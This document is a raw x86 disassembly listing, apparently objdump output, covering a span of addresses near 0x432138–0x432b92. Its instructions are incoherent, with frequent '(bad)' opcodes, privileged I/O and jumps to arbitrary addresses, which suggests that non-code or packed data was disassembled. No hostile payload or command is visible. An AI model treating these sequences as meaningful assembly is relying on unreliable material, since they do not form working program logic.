  432138:	cmp    eax,0xfed107cd
  43213d:	dec    ecx
  43213e:	sti    
  43213f:	(bad)  
  432140:	push   ecx
  432141:	push   eax
  432142:	jg     0x4320e9
  432144:	ret    0xf27c
  432147:	add    BYTE PTR [eax],al
  432149:	popa   
  43214a:	jp     0x43214a
  43214c:	jnp    0x43217d
  43214e:	mov    esp,DWORD PTR gs:[edx+0x5c44cc6]
  432155:	mov    cl,0x2f
  432157:	jmp    DWORD PTR [ecx-0x5bbff615]
  43215d:	jle    0x43211f
  43215f:	jne    0x43210a
  432161:	les    eax,FWORD PTR [eax+ebx*1-0x74]
  432165:	or     al,0xfd
  432167:	dec    DWORD PTR [ebx-0x60003784]
  43216d:	test   BYTE PTR [ebp+eax*2+0x458c92fc],cl
  432174:	jl     0x432109
  432176:	not    BYTE PTR ds:0x3b51e4
	...
  432198:	add    BYTE PTR [eax],al
  43219a:	icebp  
  43219b:	ret    0x1073
  43219e:	mov    ebx,0x718d0b2d
  4321a3:	mov    ebx,0x933875f6
  4321a8:	not    BYTE PTR ds:0x3b51b0
  4321ae:	scas   eax,DWORD PTR es:[edi]
  4321af:	cmp    eax,0x4f898bbf
  4321b4:	jp     0x432196
  4321b6:	push   ebx
  4321b7:	pop    ecx
  4321b8:	mov    BYTE PTR [ecx],al
  4321ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321bb:	das    
  4321bc:	inc    DWORD PTR [eax]
  4321be:	jno    0x4321be
  4321c0:	cmp    BYTE PTR [edi-0x14],0xa3
  4321c4:	stc    
  4321c5:	xor    cl,BYTE PTR [ebx]
  4321c7:	xor    DWORD PTR [edi+0x14],0xffffffe5
  4321cb:	sub    eax,0x3640d03
  4321d0:	add    BYTE PTR [eax],al
  4321d2:	xchg   edx,eax
  4321d3:	leave  
  4321d4:	add    BYTE PTR [ebx-0x36a6694e],cl
  4321da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321db:	mov    BYTE PTR [edx+0x5fd80dec],al
  4321e1:	or     BYTE PTR [edi],cl
  4321e3:	pop    ecx
  4321e4:	dec    DWORD PTR [esi+0x5b]
  4321e7:	rcr    BYTE PTR [eax],cl
  4321e9:	enter  0x191f,0x4
  4321ed:	xchg   ebp,edx
  4321ef:	shl    BYTE PTR [ebx-0x51a6b27a],0xfa
  4321f6:	mov    ebx,0x37543d3
  4321fb:	rol    dl,cl
  4321fd:	pop    es
	...
  43221a:	add    BYTE PTR [eax],al
  43221c:	or     BYTE PTR [edi+0x1],cl
  43221f:	add    BYTE PTR ds:0x15754b09,cl
  432225:	jle    0x432220
  432227:	iret   
  432228:	pop    ds
  432229:	sbb    DWORD PTR [eax+esi*4],eax
  43222c:	or     al,0x82
  43222e:	mov    al,0x67
  432230:	shl    ecx,0xc3
  432233:	(bad)  
  432234:	mov    edi,0x4d8531dd
  432239:	sub    esi,edi
  43223b:	xchg   dl,cl
  43223d:	pusha  
  43223e:	jle    0x432200
  432240:	and    eax,edx
  432242:	sub    DWORD PTR [esi+0xf],esp
  432245:	xor    DWORD PTR [ebx-0x51a7327a],edi
  43224b:	cli    
  43224c:	sbb    BYTE PTR [ecx-0x23f2c012],ch
  432252:	inc    ebx
  432253:	jne    0x43222e
  432255:	jo     0x43225a
  432257:	add    DWORD PTR ds:0xfbf7e59,ecx
  43225d:	mov    ch,BYTE PTR [edi+0x50efc08c]
  432263:	sti    
  432264:	add    bl,bl
  432266:	cmp    edi,ebx
  432268:	in     eax,0x97
  43226a:	add    eax,DWORD PTR [eax]
  43226c:	or     eax,0x57a43d4
  432271:	loop   0x4322b4
  432273:	push   eax
  432274:	xchg   esi,eax
  432275:	add    BYTE PTR [edx],ch
  432277:	cld    
  432278:	adc    DWORD PTR [esi],ebx
  43227a:	in     eax,0x3
  43227c:	or     eax,0xd8d1b0
	...
  43229d:	add    BYTE PTR [edx],dl
  43229f:	pop    eax
  4322a0:	mul    ebx
  4322a2:	mov    DWORD PTR [ebp+0x6c],0xf7a24043
  4322a9:	inc    ebx
  4322aa:	push   edi
  4322ab:	test   eax,0x11419f
  4322b0:	push   ss
  4322b1:	adc    edi,DWORD PTR [edx+0x6084307]
  4322b7:	jnp    0x4322fd
  4322b9:	add    ecx,DWORD PTR ds:0x93ac0100
  4322bf:	shr    al,0x4e
  4322c2:	sbb    BYTE PTR [edi+edx*8-0x1c87853d],dl
  4322c9:	or     dh,BYTE PTR [edx+0xd736cf5]
  4322cf:	add    cl,ch
  4322d1:	fstp   TBYTE PTR [edx-0xcfc170a]
  4322d7:	neg    DWORD PTR [ecx+0x18]
  4322da:	xor    eax,0x4603a62e
  4322df:	jmp    0x4322e5
  4322e1:	cmc    
  4322e2:	add    al,BYTE PTR [eax]
  4322e4:	jo     0x4322ab
  4322e6:	adc    cl,BYTE PTR [ecx]
  4322e8:	xlat   BYTE PTR es:[ebx]
  4322ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4322eb:	lods   al,BYTE PTR ds:[esi]
  4322ec:	pop    ebp
  4322ed:	adc    BYTE PTR [ebp-0xe],dh
  4322f0:	test   al,0x3
  4322f2:	mov    ch,0xcf
  4322f4:	ins    DWORD PTR es:[edi],dx
  4322f5:	ret    
  4322f6:	sbb    al,BYTE PTR [esi-0x2d]
  4322f9:	dec    esi
  4322fa:	ds jns 0x4322a0
  4322fd:	sti    
  4322fe:	jb     0x4322c4
  432300:	pop    ebp
  432301:	ret    
	...
  43231e:	add    BYTE PTR [eax],al
  432320:	add    bh,BYTE PTR [eax-0x58]
  432323:	pop    es
  432324:	test   BYTE PTR ds:0xb58a35fa,0xff
  43232b:	loopne 0x4322f3
  43232d:	jl     0x4322b6
  43232f:	test   eax,0xf141770e
  432334:	dec    ecx
  432335:	adc    bh,bl
  432337:	mov    dh,0x54
  432339:	mov    edx,0x7d394107
  43233e:	inc    eax
  43233f:	jmp    0xc64ee28b
  432344:	and    ecx,DWORD PTR [ecx-0x2d]
  432347:	jb     0x4323bc
  432349:	cld    
  43234a:	mov    BYTE PTR [eax],ch
  43234c:	mov    eax,ds:0x71e1427d
  432351:	pop    es
  432352:	pop    eax
  432353:	in     eax,dx
  432354:	ret    0x38f1
  432357:	inc    ecx
  432358:	xchg   ecx,eax
  432359:	ror    BYTE PTR ds:0x73f8b6d0,1
  43235f:	fcom   QWORD PTR [edi]
  432361:	test   al,0xf
  432363:	std    
  432364:	jbe    0x43237b
  432366:	shr    BYTE PTR [ecx],0xf6
  432369:	rol    DWORD PTR [ebx],0x12
  43236c:	int3   
  43236d:	scas   eax,DWORD PTR es:[edi]
  43236e:	out    0x4e,eax
  432370:	jb     0x4323b6
  432372:	sti    
  432373:	jo     0x432320
  432375:	cld    
  432376:	cli    
  432377:	pop    ss
  432378:	shr    dl,0xb7
  43237b:	sti    
  43237c:	dec    esi
  43237d:	inc    esp
  43237e:	mov    bh,ch
  432380:	sbb    al,0x40
  432382:	push   edi
  432383:	sub    al,BYTE PTR [eax]
	...
  4323a1:	add    BYTE PTR [ecx+eax*8+0x220b9607],dh
  4323a8:	add    al,0xe9
  4323aa:	push   cs
  4323ab:	mov    al,0xba
  4323ad:	in     eax,0xf
  4323af:	add    BYTE PTR [eax],al
  4323b1:	mov    esi,0xfa23eac9
  4323b6:	dec    esi
  4323b7:	inc    esp
  4323b8:	test   BYTE PTR [ecx],ch
  4323ba:	loop   0x4323ba
  4323bc:	sub    eax,0x486629
  4323c1:	add    ah,ah
  4323c3:	inc    DWORD PTR [edx+0x53c8fc4e]
  4323c9:	and    al,0xec
  4323cb:	mov    WORD PTR [eax+0x1d2c1],es
  4323d1:	add    BYTE PTR [esp+edi*4+0x7ab3ffe4],bh
  4323d8:	shl    BYTE PTR [ebp-0x2a],0xc8
  4323dc:	inc    ebp
  4323dd:	or     BYTE PTR [esp+esi*4-0x38ac000a],bl
  4323e4:	xor    BYTE PTR [eax],0xaa
  4323e7:	(bad)  
  4323e8:	dec    DWORD PTR [edx-0x7e77bc0e]
  4323ee:	cwde   
  4323ef:	std    
  4323f0:	(bad)  
  4323f1:	call   FWORD PTR [edi]
  4323f3:	cmp    eax,0x18b75303
  4323f8:	mov    DWORD PTR [eax-0x2a4],ebx
  4323fe:	out    dx,eax
  4323ff:	cmp    al,0x3
  432401:	mov    esp,ebp
  432403:	repnz std 
  432405:	inc    DWORD PTR [eax]
	...
  432423:	add    BYTE PTR [eax+ecx*8+0x3d],ah
  432427:	or     ch,ch
  432429:	(bad)  
  43242a:	aas    
  43242b:	push   es
  43242c:	je     0x43242d
  43242e:	add    BYTE PTR [esi+0x5c],0xbc
  432432:	jg     0x432478
  432434:	push   0xffffffff
  432436:	inc    DWORD PTR [eax]
  432438:	xor    al,0xff
  43243a:	dec    DWORD PTR [edx-0x6777b896]
  432440:	jl     0x43243f
  432442:	(bad)  
  432443:	(bad)  
  432444:	mov    edi,0xed33033c
  432449:	pop    esp
  43244a:	mov    BYTE PTR [eax-0x27c],cl
  432450:	lahf   
  432451:	cmp    al,0x3
  432453:	mov    BYTE PTR [ecx+edx*4+0x590d0001],cl
  43245a:	js     0x43249e
  43245c:	adc    eax,0x4d86b181
  432461:	pop    ecx
  432462:	add    cl,BYTE PTR [esi+0xa]
  432465:	pop    ecx
  432466:	dec    DWORD PTR [edi-0x16]
  432469:	and    esi,edi
  43246b:	adc    BYTE PTR [ebp+0x59],cl
  43246e:	js     0x4324b2
  432470:	add    eax,0x3d6802af
  432475:	into   
  432476:	ret    
  432477:	call   DWORD PTR [ecx]
  432479:	pop    es
  43247a:	cld    
  43247b:	inc    edx
  43247d:	or     BYTE PTR [edi+0x15],al
  432480:	xchg   ecx,eax
  432481:	es mov edi,0xfc1a87ff
  432487:	push   ecx
	...
  4324a4:	add    BYTE PTR [eax],al
  4324a6:	cwde   
  4324a7:	loopne 0x4324bc
  4324a9:	add    cl,BYTE PTR ds:0x6767b459
  4324af:	clc    
  4324b0:	sar    edi,0x2a
  4324b3:	jmp    0x150629b
  4324b8:	lods   al,BYTE PTR ds:[esi]
  4324b9:	pop    edi
  4324ba:	iret   
  4324bb:	pop    eax
  4324bc:	xlat   BYTE PTR ds:[ebx]
  4324bd:	inc    edi
  4324be:	in     eax,dx
  4324bf:	push   ss
  4324c0:	add    al,0x68
  4324c2:	cmp    eax,0xf2ffc1f9
  4324c7:	xor    bh,bl
  4324c9:	cmp    eax,0x5b35010d
  4324ce:	iret   
  4324cf:	pop    eax
  4324d0:	xlat   BYTE PTR ds:[ebx]
  4324d1:	xor    al,0xb0
  4324d3:	xchg   esi,eax
  4324d4:	jmp    DWORD PTR [edi-0xa]
  4324d7:	mov    eax,ebp
  4324d9:	call   DWORD PTR [ecx-0x71980c9e]
  4324df:	aaa    
  4324e0:	(bad)  
  4324e3:	add    DWORD PTR [ebx+eax*1-0x7708656a],esi
  4324ea:	or     al,0xde
  4324ec:	mov    ebp,0x2cff8e07
  4324f1:	adc    dl,ah
  4324f3:	cmp    al,ah
  4324f5:	jmp    0x43255a
  4324f7:	icebp  
  4324f8:	jnp    0x43253e
  4324fa:	ds in  ax,0x3
  4324fe:	xchg   edx,eax
  4324ff:	mov    edx,0xfd7ebbec
  432504:	mov    al,0xd0
  432506:	(bad)  
  432507:	je     0x4324b4
  432509:	sti    
	...
  432526:	add    BYTE PTR [eax],al
  432528:	arpl   WORD PTR [eax],cx
  43252a:	jmp    0x19842bfe
  43252f:	dec    ebx
  432530:	cmp    eax,0x12c16df0
  432535:	jge    0x432540
  432537:	add    al,0x64
  432539:	cmp    eax,0x7da97f34
  43253e:	aad    0xf7
  432540:	inc    ebx
  432541:	test   eax,0x4116d0b9
  432546:	fsub   QWORD PTR [ebx+0x13]
  432549:	shr    al,0x7e
  43254c:	xchg   ebp,eax
  43254d:	or     eax,0x414e78be
  432552:	jo     0x4324fc
  432554:	jle    0x4325cd
  432556:	xor    al,0x48
  432558:	inc    eax
  432559:	inc    edx
  43255a:	jmp    0x6a343262
  43255f:	jbe    0x43256e
  432561:	add    cl,ch
  432563:	jle    0x43253c
  432565:	neg    DWORD PTR [ebp-0x50]
  432568:	or     bl,al
  43256a:	in     al,0x4
  43256c:	or     eax,0xff446600
  432571:	push   edi
  432572:	gs pop edi
  432574:	inc    esi
  432575:	inc    ecx
  432576:	ins    BYTE PTR es:[edi],dx
  432577:	inc    ebx
  432578:	mov    eax,0xc04ab1c3
  43257d:	repz jae 0x432540
  432580:	ds mov al,0x50
  432583:	mov    esi,0xe8ffffc4
  432588:	mov    ds:0xc2743f,al
	...
  4325a9:	add    BYTE PTR [ecx+0x9e9fbc3],dl
  4325af:	add    BYTE PTR [eax],al
  4325b1:	popf   
  4325b2:	std    
  4325b3:	mov    cl,0x52
  4325b5:	push   ss
  4325b6:	(bad)  
  4325b8:	dec    esi
  4325b9:	add    eax,ebx
  4325bb:	aas    
  4325bc:	sti    
  4325bd:	push   es
  4325be:	jae    0x432608
  4325c0:	xchg   DWORD PTR [edi-0x22a7871a],esp
  4325c6:	inc    ebx
  4325c7:	cli    
  4325c8:	xchg   BYTE PTR [edi-0x2282862a],ah
  4325ce:	dec    edi
  4325cf:	rcl    BYTE PTR [ebx],0xe8
  4325d2:	sbb    DWORD PTR [ecx+0x74],ecx
  4325d5:	add    DWORD PTR [eax-0x42],eax
  4325d8:	pop    es
  4325d9:	inc    ebx
  4325da:	push   cs
  4325db:	fadd   DWORD PTR [ecx+0x6340cb48]
  4325e1:	push   0xffffffae
  4325e3:	add    al,BYTE PTR [eax]
  4325e5:	inc    ecx
  4325e6:	aam    0xdf
  4325e8:	cmp    eax,0x67ad61e9
  4325ed:	cmp    eax,0x9dffc010
  4325f2:	and    DWORD PTR [ebp+0x50],eax
  4325f5:	loope  0x432580
  4325f7:	cmp    esp,DWORD PTR [eax]
  4325f9:	fs shl esp,1
  4325fc:	xchg   esp,eax
  4325fd:	stos   BYTE PTR es:[edi],al
  4325fe:	add    bl,al
  432600:	repz cmc 
  432602:	or     al,0xad
  432604:	out    0x4a,eax
  432606:	jo     0x432648
  432608:	sti    
  432609:	outs   dx,BYTE PTR ds:[esi]
  43260a:	dec    edx
  43260b:	dec    esp
  43260c:	call   0x432693
	...
  432629:	add    BYTE PTR [eax],al
  43262b:	add    BYTE PTR [eax+0x40],ah
  43262e:	sti    
  43262f:	jae    0x432601
  432631:	pop    eax
  432632:	push   es
  432633:	push   esi
  432634:	push   edx
  432635:	dec    esp
  432636:	call   0xfb834e99
  43263b:	add    BYTE PTR [esi],dh
  43263d:	mov    esp,0xb9dd5b56
  432642:	pop    es
  432643:	add    BYTE PTR [ecx+0x718bebc3],al
  432649:	dec    eax
  43264a:	sub    ah,0x1c
  43264d:	cli    
  43264e:	(bad)  
  43264f:	inc    ebx
  432651:	test   al,al
  432653:	sub    al,0xc4
  432655:	enter  0x874,0x59
  432659:	mov    edi,0xc90bfdf7
  43265e:	dec    edi
  43265f:	mov    ecx,DWORD PTR ds:0xdb5d27dc
  432665:	enter  0xc084,0x60
  432669:	in     al,0x82
  43266b:	inc    edi
  43266c:	fdiv   DWORD PTR [ecx-0x7e]
  43266f:	ja     0x432621
  432671:	mov    dh,0x83
  432673:	inc    ebp
  432674:	fadd   st(6),st
  432676:	idiv   bh
  432678:	hlt    
  432679:	mov    dh,0x84
  43267b:	clc    
  43267c:	leave  
  43267d:	enter  0x50f6,0xbc
  432681:	aam    0xf5
  432683:	call   FWORD PTR [ebx+0x69]
  432686:	jg     0x432648
  432688:	loopne 0x43268e
  43268a:	test   DWORD PTR [edi-0x64],0x5fc014
	...
  4326ad:	add    BYTE PTR [ebp+0x670007c5],bh
  4326b3:	ret    
  4326b4:	aas    
  4326b5:	ret    0x358
  4326b8:	push   ebp
  4326b9:	mov    ebx,DWORD PTR [eax+0x734ec84]
  4326bf:	jb     0x4326eb
  4326c1:	fisttp DWORD PTR [esi]
  4326c3:	cmp    BYTE PTR [ebp+eax*2-0x76b48b78],cl
  4326ca:	dec    ecx
  4326cb:	xrelease mov BYTE PTR [ebp+0x0],bl
  4326cf:	mov    edx,0xd60dd85c
  4326d4:	jmp    0xffac4a28
  4326d9:	jle    0x432724
  4326db:	xor    eax,0xb03d7572
  4326e0:	mov    eax,ds:0x42e935e7
  4326e5:	sti    
  4326e6:	sbb    ah,BYTE PTR [ebp-0x3376f4c2]
  4326ec:	(bad)  
  4326ed:	dec    DWORD PTR ds:0xf507ca1e
  4326f3:	mov    eax,DWORD PTR [edx-0x5]
  4326f6:	cli    
  4326f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326f8:	or     ecx,DWORD PTR ds:[ecx+0xdfffedb]
  4326ff:	mov    dl,0xcf
  432701:	add    edx,DWORD PTR [eax-0x2dadd095]
  432707:	arpl   WORD PTR [ebx-0x5c],dx
  43270a:	xchg   al,ch
  43270c:	add    ecx,DWORD PTR [ecx+0x5d7d5950]
	...
  43272e:	add    BYTE PTR [eax],al
  432730:	mov    ecx,0x1fdff155
  432735:	jmp    0x418bb03d
  43273a:	pop    es
  43273b:	mov    edi,0x7edd2d23
  432740:	and    edi,ebp
  432742:	inc    ecx
  432743:	pop    esp
  432744:	and    DWORD PTR ds:0x614888bf,esp
  43274a:	inc    ebx
  43274b:	jae    0x43275e
  43274d:	lods   al,BYTE PTR ds:[esi]
  43274e:	shr    bl,0x96
  432751:	gs jge 0x432757
  432754:	gs jbe 0x4327b9
  432757:	sti    
  432758:	jb     0x432799
  43275a:	test   al,0xf3
  43275c:	jecxz  0x4327bc
  43275e:	jbe    0x4327a5
  432760:	inc    ebp
  432761:	add    BYTE PTR [edi+0x61],bh
  432764:	iret   
  432765:	sub    bh,dl
  432767:	jp     0x432755
  432769:	jmp    DWORD PTR [esi+0x193eda03]
  43276f:	inc    edi
  432770:	fisttp QWORD PTR [ebx]
  432772:	inc    ax
  432774:	sbb    eax,0xdfaa446
  432779:	test   DWORD PTR [ecx],ebp
  43277b:	shr    DWORD PTR [ebx],1
  43277d:	xchg   BYTE PTR [edx+edi*8+0x3f18b491],bl
  432784:	shr    BYTE PTR [ebx],1
  432786:	jmp    0x1142fa57
  43278b:	std    
  43278c:	add    al,0x3e
  43278e:	sbb    bh,BYTE PTR [ebx+0x48]
  432791:	push   esp
  432792:	mov    eax,ds:0xcf
	...
  4327af:	add    BYTE PTR [eax],al
  4327b1:	add    bl,bh
  4327b3:	lds    edx,FWORD PTR [ebx+0x20b3f7fb]
  4327b9:	pop    esp
  4327ba:	je     0x4327d6
  4327bc:	jmp    0x191e4bc4
  4327c1:	rol    BYTE PTR ds:0xd633743d,1
  4327c7:	adc    esp,DWORD PTR [ecx+0x6f000af1]
  4327cd:	ror    BYTE PTR [ebx],0x29
  4327d0:	add    BYTE PTR [ecx+0x40],bh
  4327d3:	push   eax
  4327d4:	shr    DWORD PTR [eax],0xb0
  4327d7:	cmp    eax,0x54507ac2
  4327dc:	xor    eax,edx
  4327de:	mov    ds:0x97fc3bc5,eax
  4327e3:	mov    bl,0x90
  4327e5:	pop    ebx
  4327e6:	rcr    BYTE PTR [ecx],1
  4327e8:	jmp    0xb91e6bf0
  4327ed:	iret   
  4327ee:	adc    eax,0x76341c3d
  4327f3:	adc    edx,DWORD PTR [ecx-0xf]
  4327f6:	xor    al,BYTE PTR [eax]
  4327f8:	mov    bh,0x43
  4327fa:	(bad)  
  4327fb:	fsubr  DWORD PTR [edi+0x941]
  432801:	sbb    al,0xd6
  432803:	sub    edi,DWORD PTR [edi+0x71]
  432806:	retf   
  432807:	mov    dl,0x8
  432809:	pop    bp
  43280b:	or     ebx,edi
  43280d:	hlt    
  43280e:	add    cl,BYTE PTR [esi]
  432810:	inc    eax
  432811:	jmp    0xb752dae9
	...
  432832:	add    BYTE PTR [eax],al
  432834:	jle    0x432870
  432836:	jne    0x43282d
  432838:	inc    esp
  432839:	cmp    eax,0x3a26b4fa
  43283e:	adc    eax,0xfffd215d
  432843:	imul   eax,DWORD PTR [ebp+0xd],0xf605a700
  43284a:	inc    esp
  43284b:	stc    
  43284c:	retf   0x2e3a
  43284f:	sub    DWORD PTR [edi],ebx
  432851:	inc    edi
  432852:	bound  esp,QWORD PTR [eax-0x6]
  432855:	mov    esi,0x3ce22b5c
  43285a:	push   esp
  43285b:	jb     0x432897
  43285d:	int    0x86
  43285f:	adc    DWORD PTR [eax+0x48f27ed1],ebp
  432865:	mov    bl,0x6
  432867:	out    0xda,al
  432869:	or     bl,bh
  43286b:	hlt    
  43286c:	add    cl,BYTE PTR [esi]
  43286e:	inc    eax
  43286f:	jmp    0xe9a980a9
  432874:	dec    ecx
  432875:	mov    bl,0xb
  432877:	cli    
  432878:	pop    eax
  432879:	cmp    DWORD PTR [ebp-0xf],esi
  43287c:	and    eax,0x5055e87d
  432881:	cmp    ebx,edi
  432883:	bound  eax,QWORD PTR [ecx-0x7d]
  432886:	sti    
  432887:	daa    
  432888:	sub    al,cl
  43288a:	mov    ebp,fs
  43288c:	or     DWORD PTR [ebx+0x24721dc0],eax
  432892:	jge    0x432884
  432894:	push   cs
  432895:	add    BYTE PTR [edi+0x0],al
	...
  4328b3:	add    BYTE PTR [eax],al
  4328b5:	add    ah,ah
  4328b7:	mov    esp,0x6b4674ed
  4328bc:	div    BYTE PTR [ebp+0x70]
  4328bf:	mov    bh,0xba
  4328c1:	call   FWORD PTR [ecx+0x38]
  4328c4:	jecxz  0x43293b
  4328c6:	mov    bl,0xc2
  4328c8:	test   BYTE PTR [ebx+0x32f9d6ea],0xe4
  4328cf:	bound  ebx,QWORD PTR [ecx+0x5b]
  4328d2:	popa   
  4328d3:	mov    esi,0xb7890007
  4328d8:	jmp    0x43292b
  4328da:	xchg   DWORD PTR [edx+0x4e],ebp
  4328dd:	call   FWORD PTR [ecx+0x38]
  4328e0:	cmp    al,0xaf
  4328e3:	shl    dh,1
  4328e5:	adc    eax,0x3b2e14
  4328ea:	jg     0x4328d8
  4328ec:	mov    WORD PTR [edi+ebx*8],es
  4328ef:	mov    dl,0x43
  4328f1:	add    dh,ah
  4328f3:	mov    dh,0x44
  4328f5:	cld    
  4328f6:	jne    0x432973
  4328f8:	test   DWORD PTR [eax],0x80ffffe8
  4328fe:	daa    
  4328ff:	add    al,0xfa
  432901:	jmp    esp
  432903:	jle    0x4328f8
  432905:	add    BYTE PTR [edi+ebx*2-0x47138900],dh
  43290c:	dec    esp
  43290d:	cld    
  43290e:	int3   
  43290f:	scas   eax,DWORD PTR es:[edi]
  432910:	pop    ss
  432911:	add    BYTE PTR [ebx+edi*4-0x3aff8b41],ah
  432918:	je     0x432926
	...
  432936:	add    BYTE PTR [eax],al
  432938:	pop    ds
  432939:	cmp    eax,0xb2ac75f6
  43293e:	add    edi,DWORD PTR [eax-0x9]
  432941:	jae    0x432939
  432943:	adc    eax,0x3b3000
  432948:	jmp    0xe0ba10b
  43294d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43294e:	mov    bh,0xfa
  432950:	ss push 0x810ec0c2
  432956:	js     0x43295a
  432958:	push   ds
  432959:	jo     0x432938
  43295b:	mov    BYTE PTR [ecx],cl
  43295d:	xor    DWORD PTR [eax-0x3d],edi
  432960:	data16 es or al,0x4a
  432965:	inc    edx
  432966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432967:	push   esi
  432968:	push   esp
  432969:	out    0xf6,eax
  43296b:	jmp    eax
  43296d:	jns    0x4329b3
  43296f:	je     0x43295a
  432971:	pop    esp
  432972:	js     0x432964
  432974:	sub    bl,BYTE PTR [ebx+edi*1+0xe]
  432978:	int    0x28
  43297a:	js     0x432974
  43297c:	mov    edx,gs
  43297e:	(bad)  
  43297f:	std    
  432980:	adc    ch,BYTE PTR [ecx]
  432982:	jle    0x43297f
  432984:	or     eax,0x7a009f29
  432989:	pop    ecx
  43298a:	jb     0x4329d7
  43298c:	or     al,0x1
  43298e:	prefetcht0 BYTE PTR ds:0x61c07b29
  432995:	dec    ebp
  432996:	inc    esp
  432997:	je     0x4329c2
  432999:	pop    ecx
  43299a:	inc    esp
  43299b:	je     0x43299d
	...
  4329b9:	add    BYTE PTR [ecx],dh
  4329bb:	pop    ecx
  4329bc:	lods   al,BYTE PTR ds:[esi]
  4329bd:	cli    
  4329be:	sbb    ebp,DWORD PTR [edx]
  4329c0:	in     eax,dx
  4329c1:	xchg   DWORD PTR [esi],ebx
  4329c3:	jmp    0xa110aecb
  4329c8:	push   esp
  4329c9:	lea    ecx,[edx+0x52]
  4329cc:	sti    
  4329cd:	shl    BYTE PTR [eax],0x5f
  4329d0:	mov    ecx,DWORD PTR [edx]
  4329d2:	shr    DWORD PTR [edi+eax*1],cl
  4329d5:	add    BYTE PTR [esi-0x65377ddb],dh
  4329db:	adc    esi,ebx
  4329dd:	mov    ebp,0x85d92905
  4329e2:	pop    ebp
  4329e3:	jmp    FWORD PTR [eax+0x530b092e]
  4329e9:	push   esi
  4329ea:	repz or BYTE PTR [ebx],dh
  4329ed:	call   0x3610cbf9
  4329f2:	add    dh,BYTE PTR [edx]
  4329f4:	data16 sub cl,BYTE PTR [esi]
  4329f7:	jg     0x43299c
  4329f9:	hlt    
  4329fa:	in     al,dx
  4329fb:	(bad)  
  4329fc:	jbe    0x432a11
  4329fe:	lahf   
  4329ff:	aas    
  432a00:	dec    DWORD PTR [ebx+eiz*8]
  432a03:	mov    eax,ds:0x4e1a541d
  432a08:	es pushw cs
  432a0b:	jg     0x432a34
  432a0d:	hlt    
  432a0e:	lods   al,BYTE PTR ds:[esi]
  432a0f:	(bad)  
  432a10:	cmp    BYTE PTR [edx-0x73350f6b],ch
  432a16:	mov    esp,0x9a469afd
  432a1b:	aaa    
  432a1c:	xor    bh,BYTE PTR [ecx+0x0]
	...
  432a3a:	add    BYTE PTR [eax],al
  432a3c:	or     BYTE PTR [ebx],bh
  432a3e:	mov    ch,0xe7
  432a40:	push   cs
  432a41:	cmp    esp,edi
  432a43:	and    edx,DWORD PTR [ebx]
  432a45:	shr    al,0x6
  432a48:	int    0xd0
  432a4a:	adc    DWORD PTR [eax+0x2bb3082e],edi
  432a50:	mov    ah,0x18
  432a52:	jmp    0x838a5c5a
  432a57:	mov    WORD PTR [ecx],cs
  432a59:	lock or BYTE PTR es:0x4042f17d,cl
  432a61:	push   es
  432a62:	loop   0x432a1b
  432a64:	out    dx,al
  432a65:	add    ebx,edx
  432a67:	sbb    cl,dl
  432a69:	push   cs
  432a6a:	sub    DWORD PTR [ebx*2+0x12e85539],eax
  432a71:	rcl    al,cl
  432a73:	mov    DWORD PTR ds:0x1149e900,eax
  432a79:	add    al,BYTE PTR [eax]
  432a7b:	jmp    0x6a432ec8
  432a80:	retf   0x3dd
  432a83:	jmp    0xa972284d
  432a88:	sub    esp,ebp
  432a8a:	jle    0x432a1d
  432a8c:	iret   
  432a8d:	mov    dl,0x5
  432a8f:	mov    fs,WORD PTR [edx+0x58603dd]
  432a95:	and    BYTE PTR [esi],cl
  432a97:	sub    DWORD PTR [ecx],edx
  432a99:	into   
  432a9a:	mov    WORD PTR [ebp-0x14bd74f2],?
	...
  432abc:	add    BYTE PTR [eax],al
  432abe:	xchg   ebp,eax
  432abf:	inc    eax
  432ac0:	je     0x432abf
  432ac2:	neg    BYTE PTR ds:0x830ee913
  432ac8:	rcr    ch,0x3
  432acb:	into   
  432acc:	cli    
  432acd:	aad    0x32
  432acf:	add    eax,0x11545150
  432ad4:	add    cl,ch
  432ad6:	sub    al,0x7b
  432ad8:	add    al,0xe9
  432ada:	mov    edi,DWORD PTR [ebx+eiz*1-0x7931f11b]
  432ae1:	sbb    ebp,eax
  432ae3:	cld    
  432ae4:	sub    DWORD PTR cs:[ebx],ebp
  432ae7:	in     al,dx
  432ae8:	jle    0x432b01
  432aea:	dec    edi
  432aeb:	mov    bl,0xb
  432aed:	push   cs
  432aee:	mov    ds:0x50607dc,al
  432af3:	inc    esp
  432af4:	push   cs
  432af5:	test   eax,0x64f0810e
  432afa:	(bad)  
  432afb:	inc    DWORD PTR [ecx+ebp*1-0x6e17e37e]
  432b02:	and    al,0x0
  432b04:	add    BYTE PTR [ecx+edx*2-0x4c],ah
  432b08:	push   es
  432b09:	aas    
  432b0a:	dec    esp
  432b0b:	mov    ah,0x23
  432b0d:	fnstsw WORD PTR [esi-0x53fff7e0]
  432b13:	cld    
  432b14:	call   FWORD PTR [ebp+0x66]
  432b17:	pop    es
  432b18:	add    BYTE PTR [ebx-0xe],dl
  432b1b:	mov    dh,cl
  432b1d:	push   edi
  432b1e:	out    dx,eax
  432b1f:	sti    
  432b20:	test   dh,dh
	...
  432b3e:	add    BYTE PTR [eax],al
  432b40:	and    BYTE PTR [edx+eax*4+0x1d],al
  432b44:	test   BYTE PTR [ecx],dl
  432b46:	inc    eax
  432b47:	add    bh,ah
  432b49:	mov    esi,0xbf6c75f6
  432b4e:	jae    0x432b74
  432b50:	inc    esp
  432b51:	mov    edi,0xbe8c8bca
  432b56:	sub    eax,0xd88a77ff
  432b5b:	lea    ebp,[eax+0x3b]
  432b5e:	mov    WORD PTR [ebp+edi*1+0x2],cs
  432b62:	call   0x3f6e3d
  432b67:	and    esp,0x77
  432b6a:	push   cs
  432b6b:	lea    esi,[eax]
  432b6d:	dec    DWORD PTR [edi-0x75]
  432b70:	xor    bh,BYTE PTR [edi-0x76bfdb8d]
  432b76:	add    al,0x58
  432b78:	je     0x432b5e
  432b7a:	mov    esp,0xb003f417
  432b7f:	add    DWORD PTR [edi],ebx
  432b81:	(bad)  
  432b82:	sub    eax,eax
  432b84:	mov    ebx,0xe0c25221
  432b89:	add    edi,DWORD PTR [ebx+0x7c]
  432b8c:	sar    bh,1
  432b8e:	call   DWORD PTR [edx-0x7e]
  432b91:	pop    eax
  432b92:	sbb    al,0x5f
